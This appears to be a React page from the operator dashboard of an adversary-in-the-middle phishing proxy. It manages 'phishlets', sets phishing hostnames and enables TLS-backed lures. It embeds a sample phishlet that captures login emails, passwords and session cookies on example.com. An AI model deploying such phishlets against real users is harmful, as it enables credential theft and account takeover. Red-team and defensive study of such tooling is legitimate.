import { useEffect, useState } from 'react'
import { Link } from 'react-router-dom'
import { api } from '../api'
import { useAuth } from '../auth'
import { Card, Button, Badge, Modal, Input, Spinner } from '../ui'
import PhishletEditor from '../PhishletEditor'

const SAMPLE = `min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: true, is_landing: true, auto_filter: true}
sub_filters: []
auth_tokens:
  - domain: '.example.com'
    keys: ['session']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'www.example.com'
  path: '/login'
`

function ImportModal({ onClose, onDone }) {
  const [name, setName] = useState('')
  const [yaml, setYaml] = useState(SAMPLE)
  const [valid, setValid] = useState(false)
  const [err, setErr] = useState('')
  const [busy, setBusy] = useState(false)
  async function submit() {
    setBusy(true); setErr('')
    try { await api.importPhishlet(name.trim(), yaml); onDone() }
    catch (e) { setErr(e.message) } finally { setBusy(false) }
  }
  return (
    <Modal open={true} onClose={onClose} title="Import phishlet" width="max-w-5xl">
      <div className="space-y-3">
        <div>
          <label className="mb-1 block text-xs font-medium text-[var(--text-muted)]">Name</label>
          <Input value={name} onChange={(e) => setName(e.target.value)} placeholder="letters, digits, - or _" className="w-64" />
          <span className="ml-2 text-xs text-[var(--text-dim)]">saved as &lt;name&gt;.yaml</span>
        </div>
        <PhishletEditor value={yaml} onChange={setYaml} onValidity={setValid} />
        {err && <div className="rounded-lg bg-[var(--danger-weak)] px-3 py-2 text-sm text-[var(--danger)]">{err}</div>}
        <div className="flex justify-end gap-2 pt-1">
          <Button variant="ghost" onClick={onClose}>Cancel</Button>
          <Button variant="primary" onClick={submit} disabled={busy || !name.trim() || !valid} title={!valid ? 'Fix validation errors first' : ''}>{busy ? 'Importing…' : 'Import'}</Button>
        </div>
      </div>
    </Modal>
  )
}

function EditModal({ name, onClose, onDone }) {
  const [yaml, setYaml] = useState(null)
  const [readOnly, setReadOnly] = useState(false)
  const [valid, setValid] = useState(false)
  const [err, setErr] = useState('')
  const [busy, setBusy] = useState(false)
  useEffect(() => {
    api.phishletYaml(name).then((r) => { setYaml(r.yaml); setReadOnly(r.read_only) }).catch((e) => setErr(e.message))
  }, [name])
  async function save() {
    setBusy(true); setErr('')
    try { await api.savePhishletYaml(name, yaml); onDone() } catch (e) { setErr(e.message) } finally { setBusy(false) }
  }
  return (
    <Modal open={true} onClose={onClose} title={`Edit phishlet: ${name}`} width="max-w-5xl">
      {yaml === null && !err ? <Spinner /> : (
        <div className="space-y-3">
          {readOnly && <div className="rounded-lg bg-[var(--warn-weak)] px-3 py-2 text-sm text-[var(--warn)]">Child phishlet derived from a parent — can't be edited directly.</div>}
          {yaml !== null && <PhishletEditor value={yaml} onChange={setYaml} readOnly={readOnly} onValidity={setValid} />}
          {err && <div className="rounded-lg bg-[var(--danger-weak)] px-3 py-2 text-sm text-[var(--danger)]">{err}</div>}
          <div className="flex justify-end gap-2 pt-1">
            <Button variant="ghost" onClick={onClose}>Close</Button>
            {!readOnly && <Button variant="primary" onClick={save} disabled={busy || yaml === null || !valid} title={!valid ? 'Fix validation errors first' : ''}>{busy ? 'Saving…' : 'Save & reload'}</Button>}
          </div>
        </div>
      )}
    </Modal>
  )
}

function ChildModal({ templates, onClose, onDone }) {
  const [name, setName] = useState('')
  const [parent, setParent] = useState(templates[0]?.name || '')
  const [params, setParams] = useState('')
  const [err, setErr] = useState('')
  const [busy, setBusy] = useState(false)
  async function submit() {
    setBusy(true); setErr('')
    const p = {}
    for (const line of params.split('\n')) {
      const i = line.indexOf('=')
      if (i > 0) p[line.slice(0, i).trim()] = line.slice(i + 1).trim()
    }
    try { await api.createChildPhishlet(name.trim(), parent, p); onDone() }
    catch (e) { setErr(e.message) } finally { setBusy(false) }
  }
  return (
    <Modal open={true} onClose={onClose} title="Create child phishlet">
      <div className="space-y-3">
        <div><label className="mb-1 block text-xs font-medium text-[var(--text-muted)]">Name</label><Input value={name} onChange={(e) => setName(e.target.value)} className="w-64" /></div>
        <div>
          <label className="mb-1 block text-xs font-medium text-[var(--text-muted)]">Parent (template)</label>
          <select value={parent} onChange={(e) => setParent(e.target.value)} className="w-full rounded-lg border border-[var(--border)] bg-[var(--bg)] px-3 py-2 text-sm text-[var(--text)]">
            {templates.map((t) => <option key={t.name} value={t.name}>{t.name}</option>)}
          </select>
        </div>
        <div>
          <label className="mb-1 block text-xs font-medium text-[var(--text-muted)]">Parameters</label>
          <textarea value={params} onChange={(e) => setParams(e.target.value)} placeholder={'key=value\nanother=value'} className="h-24 w-full resize-y rounded-lg border border-[var(--border)] bg-[var(--bg)] p-3 font-mono text-xs text-[var(--text)]" />
          <div className="mt-1 text-xs text-[var(--text-dim)]">One <span className="font-mono">key=value</span> per line; defined by the template.</div>
        </div>
        {err && <div className="rounded-lg bg-[var(--danger-weak)] px-3 py-2 text-sm text-[var(--danger)]">{err}</div>}
        <div className="flex justify-end gap-2 pt-1">
          <Button variant="ghost" onClick={onClose}>Cancel</Button>
          <Button variant="primary" onClick={submit} disabled={busy || !name.trim() || !parent}>{busy ? 'Creating…' : 'Create'}</Button>
        </div>
      </div>
    </Modal>
  )
}

function ManageModal({ phishlet, baseDomain, onClose, onChanged, onEditYaml }) {
  const p = phishlet
  const [hostname, setHostname] = useState(p.hostname || baseDomain || '')
  const [unauth, setUnauth] = useState(p.unauth_url || '')
  const [hosts, setHosts] = useState(null)
  const [err, setErr] = useState('')
  const [busy, setBusy] = useState('')

  const run = async (key, fn) => {
    setBusy(key); setErr('')
    try { await fn(); onChanged() } catch (e) { setErr(e.message) } finally { setBusy('') }
  }
  const loadHosts = async () => {
    setErr('')
    try { const r = await api.phishletHosts(p.name); setHosts(r.lines) } catch (e) { setErr(e.message) }
  }

  return (
    <Modal open={true} onClose={onClose} title={`Manage: ${p.name}`} width="max-w-xl">
      <div className="space-y-5">
        {err && <div className="rounded-lg bg-[var(--danger-weak)] px-3 py-2 text-sm text-[var(--danger)]">{err}</div>}

        <div>
          <label className="mb-1 block text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">Hostname</label>
          <div className="flex gap-2">
            <Input value={hostname} onChange={(e) => setHostname(e.target.value)} placeholder={baseDomain ? `login.${baseDomain}` : 'set base domain first'} />
            <Button onClick={() => run('host', () => api.setPhishletHostname(p.name, hostname.trim()))} disabled={!baseDomain || busy === 'host'}>Set</Button>
          </div>
          <div className="mt-1 text-xs text-[var(--text-dim)]">Setting the hostname disables the phishlet; enable it again after.</div>
        </div>

        <div>
          <label className="mb-1 block text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">Unauthorized redirect</label>
          <div className="flex gap-2">
            <Input value={unauth} onChange={(e) => setUnauth(e.target.value)} placeholder="(uses global default if empty)" />
            <Button onClick={() => run('unauth', () => api.setPhishletUnauthUrl(p.name, unauth.trim()))} disabled={busy === 'unauth'}>Set</Button>
          </div>
        </div>

        <div className="flex items-center justify-between">
          <div>
            <div className="text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">Visibility</div>
            <div className="mt-0.5 text-sm text-[var(--text-muted)]">{p.hidden ? 'Hidden (requests redirected)' : 'Visible'}</div>
          </div>
          <Button onClick={() => run('vis', () => p.hidden ? api.unhidePhishlet(p.name) : api.hidePhishlet(p.name))} disabled={busy === 'vis'}>
            {p.hidden ? 'Unhide' : 'Hide'}
          </Button>
        </div>

        <div>
          <div className="mb-1 flex items-center justify-between">
            <label className="text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">DNS / hosts</label>
            <Button variant="ghost" onClick={loadHosts}>Load hosts</Button>
          </div>
          {hosts && (
            <pre className="max-h-40 overflow-auto rounded-lg border border-[var(--border)] bg-[var(--bg)] p-3 text-xs text-[var(--text-muted)]">{hosts.length ? hosts.join('\n') : 'No hosts (set hostname first).'}</pre>
          )}
        </div>

        <div className="flex items-center justify-between border-t border-[var(--border)] pt-4">
          <Button variant="ghost" onClick={() => onEditYaml(p.name)}>Edit YAML</Button>
          <Button
            variant="danger"
            disabled={busy === 'del'}
            onClick={() => {
              const msg = p.is_child
                ? `Delete child phishlet "${p.name}"?`
                : `Delete phishlet "${p.name}"? This disables it and permanently removes its YAML file from disk.`
              if (!confirm(msg)) return
              run('del', () => api.deletePhishlet(p.name))
            }}
          >
            {busy === 'del' ? 'Deleting…' : (p.is_child ? 'Delete child' : 'Delete phishlet')}
          </Button>
        </div>
      </div>
    </Modal>
  )
}

export default function Phishlets() {
  const { hasRole } = useAuth()
  const [phishlets, setPhishlets] = useState(null)
  const [baseDomain, setBaseDomain] = useState('')
  const [err, setErr] = useState('')
  const [warning, setWarning] = useState('')
  const [busy, setBusy] = useState('')
  const [importing, setImporting] = useState(false)
  const [childOpen, setChildOpen] = useState(false)
  const [editing, setEditing] = useState(null)
  const [managing, setManaging] = useState(null)
  const [hostnameFor, setHostnameFor] = useState(null)

  const load = () => api.phishlets().then((r) => setPhishlets(r.phishlets)).catch((e) => setErr(e.message))
  useEffect(() => {
    load()
    api.config().then((c) => setBaseDomain(c.general.domain || '')).catch(() => {})
  }, [])

  const canEdit = hasRole('operator')
  const templates = (phishlets || []).filter((p) => p.template)

  async function toggle(p) {
    setBusy(p.name); setErr(''); setWarning('')
    try {
      if (p.enabled) {
        await api.disablePhishlet(p.name)
      } else {
        const r = await api.enablePhishlet(p.name)
        if (r && r.warning) setWarning(r.warning)
      }
      await load()
    } catch (e) { setErr(e.message) } finally { setBusy('') }
  }

  return (
    <div>
      <div className="mb-5 flex items-center justify-between">
        <h1 className="text-2xl font-bold text-[var(--text)]">Phishlets</h1>
        {canEdit && (
          <div className="flex gap-2">
            {templates.length > 0 && <Button onClick={() => setChildOpen(true)}>+ Create child</Button>}
            <Button variant="primary" onClick={() => setImporting(true)}>+ Import phishlet</Button>
          </div>
        )}
      </div>
      {err && <div className="mb-4 rounded-lg bg-[var(--danger-weak)] px-4 py-3 text-[var(--danger)]">{err}</div>}
      {warning && <div className="mb-4 rounded-lg border border-[var(--warn)] bg-[var(--warn-weak)] px-4 py-3 text-sm text-[var(--warn)]">⚠ {warning}</div>}
      {phishlets && !baseDomain && (
        <div className="mb-4 rounded-lg border border-[var(--warn)] bg-[var(--warn-weak)] px-4 py-3 text-sm text-[var(--warn)]">
          Server base domain is not set — phishlets can't be enabled until it is.
          {hasRole('admin') ? <> Go to <Link to="/settings" className="underline">Settings</Link>.</> : <> Ask an admin to set it.</>}
        </div>
      )}
      {!phishlets ? <Spinner /> : (
        <Card className="overflow-hidden">
          <table className="w-full text-sm">
            <thead className="border-b border-[var(--border)] text-left text-xs uppercase tracking-wide text-[var(--text-dim)]">
              <tr>
                <th className="px-4 py-3">Name</th>
                <th className="px-4 py-3">Author</th>
                <th className="px-4 py-3">Hostname</th>
                <th className="px-4 py-3">State</th>
                {canEdit && <th className="px-4 py-3 text-right"></th>}
              </tr>
            </thead>
            <tbody>
              {phishlets.map((p) => (
                <tr key={p.name} className="border-b border-[var(--border)] hover:bg-[var(--surface-2)]">
                  <td className="px-4 py-3 font-medium text-[var(--text)]">
                    {p.name}
                    {p.template && <Badge color="blue"> template</Badge>}
                    {p.is_child && <span className="ml-2 text-xs text-[var(--text-dim)]">← {p.parent_name}</span>}
                  </td>
                  <td className="px-4 py-3 text-[var(--text-dim)]">{p.author || '—'}</td>
                  <td className="px-4 py-3 font-mono text-xs">
                    {p.hostname ? <span className="text-[var(--text-muted)]">{p.hostname}</span> : (!p.template && <span className="text-[var(--warn)]">not set</span>)}
                  </td>
                  <td className="px-4 py-3">
                    {p.template ? <Badge color="gray">template</Badge> : p.enabled ? <Badge color="green">enabled</Badge> : <Badge color="gray">disabled</Badge>}
                    {p.hidden && !p.template && <Badge color="yellow"> hidden</Badge>}
                    {p.collisions && p.collisions.length > 0 && (
                      <span title={`shares a hostname with: ${p.collisions.join(', ')}`}><Badge color="red"> ⚠ collision</Badge></span>
                    )}
                  </td>
                  {canEdit && (
                    <td className="px-4 py-3 text-right whitespace-nowrap">
                      {!p.template && <Button variant="ghost" onClick={() => setManaging(p)}>Manage</Button>}
                      {p.template && <Button variant="ghost" onClick={() => setEditing(p.name)}>Edit YAML</Button>}
                      {!p.template && (
                        p.enabled ? (
                          <Button variant="default" disabled={busy === p.name} onClick={() => toggle(p)}>{busy === p.name ? '…' : 'Disable'}</Button>
                        ) : p.hostname ? (
                          <Button variant="primary" disabled={busy === p.name} onClick={() => toggle(p)}>{busy === p.name ? '…' : 'Enable'}</Button>
                        ) : (
                          <Button variant="primary" title={baseDomain ? 'Set a hostname first' : 'Set base domain in Settings first'}
                            onClick={() => baseDomain ? setHostnameFor(p) : setErr('Set the server base domain in Settings before enabling phishlets.')}>
                            Set hostname →
                          </Button>
                        )
                      )}
                    </td>
                  )}
                </tr>
              ))}
            </tbody>
          </table>
        </Card>
      )}
      <p className="mt-3 text-xs text-[var(--text-dim)]">Enabling provisions TLS certs live (no restart) and needs the phishlet hostname + server base domain set.</p>

      {importing && <ImportModal onClose={() => setImporting(false)} onDone={() => { setImporting(false); load() }} />}
      {childOpen && <ChildModal templates={templates} onClose={() => setChildOpen(false)} onDone={() => { setChildOpen(false); load() }} />}
      {editing && <EditModal name={editing} onClose={() => setEditing(null)} onDone={() => { setEditing(null); load() }} />}
      {hostnameFor && <HostnameModal phishlet={hostnameFor} baseDomain={baseDomain} onClose={() => setHostnameFor(null)} onDone={() => { setHostnameFor(null); load() }} />}
      {managing && (
        <ManageModal
          phishlet={managing}
          baseDomain={baseDomain}
          onClose={() => setManaging(null)}
          onChanged={() => { load(); setManaging(null) }}
          onEditYaml={(name) => { setManaging(null); setEditing(name) }}
        />
      )}
    </div>
  )
}

function HostnameModal({ phishlet, baseDomain, onClose, onDone }) {
  const [hostname, setHostname] = useState(phishlet.hostname || baseDomain || '')
  const [err, setErr] = useState('')
  const [busy, setBusy] = useState(false)
  async function save() {
    setBusy(true); setErr('')
    try { await api.setPhishletHostname(phishlet.name, hostname.trim()); onDone() }
    catch (e) { setErr(e.message) } finally { setBusy(false) }
  }
  return (
    <Modal open={true} onClose={onClose} title={`Hostname: ${phishlet.name}`}>
      <div className="space-y-3">
        <div>
          <label className="mb-1 block text-xs font-medium text-[var(--text-muted)]">Phishing hostname</label>
          <Input value={hostname} onChange={(e) => setHostname(e.target.value)} placeholder={baseDomain ? `login.${baseDomain}` : 'set base domain first'} autoFocus />
          <div className="mt-1 text-xs text-[var(--text-dim)]">
            {baseDomain ? <>Must be <span className="text-[var(--text-muted)]">{baseDomain}</span> or a subdomain.</> : <>Set the base domain in Settings first.</>}
          </div>
        </div>
        <div className="rounded-lg bg-[var(--warn-weak)] px-3 py-2 text-xs text-[var(--warn)]">Setting the hostname disables the phishlet — enable it again afterwards.</div>
        {err && <div className="rounded-lg bg-[var(--danger-weak)] px-3 py-2 text-sm text-[var(--danger)]">{err}</div>}
        <div className="flex justify-end gap-2 pt-1">
          <Button variant="ghost" onClick={onClose}>Cancel</Button>
          <Button variant="primary" onClick={save} disabled={busy || !baseDomain}>{busy ? 'Saving…' : 'Save'}</Button>
        </div>
      </div>
    </Modal>
  )
}
